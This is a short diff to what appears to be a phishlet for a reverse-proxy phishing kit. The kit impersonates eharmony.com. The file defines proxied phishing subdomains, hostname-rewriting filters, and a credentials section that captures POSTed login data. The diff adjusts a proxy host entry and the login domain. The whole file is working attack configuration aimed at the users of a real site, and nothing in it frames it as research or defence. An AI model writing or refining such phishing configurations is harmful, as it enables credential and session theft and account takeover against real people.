@@ -3,7 +3,7 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'eharmony.com', session: true, is_landing: true, auto_filter: true}
   - {phish_sub: 'tms', orig_sub: 'tms', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: false}
-  # - {phish_sub: 'assets', orig_sub: 'assets', domain: 'nflxext.com', session: false, is_landing: false, auto_filter: false}
+  # - {phish_sub: 'login', orig_sub: 'www', domain: 'eharmony.com', session: false, is_landing: false, auto_filter: false}
 
 sub_filters:
   - {triggers_on: 'www.eharmony.com', orig_sub: 'www', domain: 'eharmony.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -26,5 +26,5 @@ credentials:
     type: 'post'
 
 login:
-  domain: 'eharmony.com'
+  domain: 'www.eharmony.com'
   path: '/profile'
